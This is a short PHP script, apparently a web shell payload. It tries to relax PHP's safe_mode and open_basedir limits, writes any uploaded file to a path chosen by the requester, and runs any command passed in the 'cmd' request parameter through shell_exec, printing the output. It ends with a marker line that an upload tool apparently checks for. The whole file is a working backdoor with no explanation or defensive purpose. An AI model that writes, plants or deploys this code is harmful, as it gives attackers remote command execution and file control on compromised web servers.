<?
@ini_restore("safe_mode");
@ini_restore("open_basedir");
$l=$_FILES["filepath"]["tmp_name"];
$newpath=$_POST["newpath"];
if ($newpath!="") move_uploaded_file($l,$newpath);
$cmd=$_REQUEST["cmd"];
if ($cmd!=""){
 echo "<pre>";
 echo shell_exec($cmd);
 echo "</pre>";
}
echo "my_delimdelimUploaded\n";
?>